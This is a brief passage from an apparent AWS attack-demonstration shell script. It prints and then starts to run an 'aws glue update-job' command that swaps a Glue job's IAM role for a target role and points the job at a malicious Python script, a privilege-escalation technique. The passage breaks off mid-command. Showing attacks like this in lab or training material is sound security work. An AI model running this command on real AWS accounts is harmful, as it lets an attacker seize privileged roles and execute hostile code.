...
show_attack_cmd "aws glue update-job --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --job-update \"Role=${TARGET_ROLE_ARN},Command={Name=pythonshell,ScriptLocation=${MALICIOUS_SCRIPT_PATH},PythonVersion=3.9},DefaultArguments={--job-language=python},MaxCapacity=0.0625,Timeout=5\" --output json"
aws glue update-job \
    --region $AWS_REGION \
    --job-name "$GLUE_JOB_NAME" \
